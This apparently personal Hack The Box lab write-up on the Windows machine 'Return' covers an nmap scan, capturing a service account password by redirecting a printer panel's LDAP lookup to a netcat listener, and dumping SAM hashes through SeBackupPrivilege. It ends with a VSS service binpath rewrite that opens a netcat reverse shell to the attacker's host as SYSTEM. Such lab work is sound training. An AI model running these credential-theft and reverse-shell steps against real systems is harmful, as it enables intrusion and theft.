---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - LDAP
  - ServerOperators
  - VSS
---
# Overview

| Name        | Return    |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -p- 10.129.179.148 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 03:59 CDT
Warning: 10.129.179.148 giving up on port because retransmission cap hit (6).
Stats: 0:05:49 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.13% done; ETC: 04:05 (0:00:07 remaining)
Nmap scan report for 10.129.179.148
Host is up (0.077s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-18 09:24:56Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
11772/tcp filtered unknown
11819/tcp filtered unknown
13971/tcp filtered unknown
21357/tcp filtered unknown
29134/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     msrpc         Microsoft Windows RPC
49674/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open     msrpc         Microsoft Windows RPC
49676/tcp open     msrpc         Microsoft Windows RPC
49679/tcp open     msrpc         Microsoft Windows RPC
49694/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-18T09:25:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m59s
```
# Exploiting

![[return.png]]

![[return2.png]]

Start listener in LDAP default port.

```bash
$ sudo rlwrap nc -nvlp 389
listening on [any] 389 ...
```

Modify request to this. Change `ip` to `tun0` and send the request.

```
POST /settings.php HTTP/1.1
Host: return.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://return.htb/settings.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://return.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

ip=10.10.14.122
```

```bash
$ sudo rlwrap nc -nvlp 389
listening on [any] 389 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.179.148] 51469
0*`%return\svc-printer�
0*`%return\svc-printer�
                       1edFg43012!!
```

We received password `1edFg43012!!` in our listener.

```bash
$ evil-winrm -i 10.129.179.148 -u 'return.local\svc-printer' -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> cat user.txt
258e32d3e3bebf31bbdb6c4017a975b6
```
# Privilege Escalation

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

We have `SeBackUpPrivilege`:

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> reg save hklm\sam C:\Users\svc-printer\Desktop\sam.save
The operation completed successfully.
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> reg save hklm\system C:\Users\svc-printer\Desktop\system.save
The operation completed successfully.
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> download sam.save
Info: Downloading C:\Users\svc-printer\Desktop\sam.save to sam.save
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> download system.save
Info: Downloading C:\Users\svc-printer\Desktop\system.save to system.save
```

```bash
$ secretsdump.py -sam sam.save -system system.save LOCAL
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xa42289f69adb35cd67d02cc84e69c314
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

```bash
$ evil-winrm -i 10.129.179.148 -u Administrator -H 34386a771aaca697f447754e4863d38a
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

Doesn't work.

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

We are in `Server Operators` group which can do many things:

> A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer. Default [User Rights](https://ss64.com/nt/ntrights.html): Allow log on locally: SeInteractiveLogonRight Back up files and directories: SeBackupPrivilege Change the system time: SeSystemTimePrivilege Change the time zone: SeTimeZonePrivilege Force shutdown from a remote system: SeRemoteShutdownPrivilege Restore files and directories SeRestorePrivilege Shut down the system: SeShutdownPrivilege

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload nc64.exe
                                        
Info: Uploading /home/ninjathebox98w1/nc64.exe to C:\Users\svc-printer\Documents\nc64.exe
                                        
Data: 60360 bytes of 60360 bytes copied
                                        
Info: Upload successful!
```

Move it to `programdata`

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> move nc64.exe C:\programdata\nc64.exe
```

Modify VSS Service and start it.

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.122 4444"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VSS
```

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.179.148] 52188
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type c:\Users\Administrator\Desktop\root.txt
type c:\Users\Administrator\Desktop\root.txt
1768bfd911829e7cb69378965e5b61cd
```

---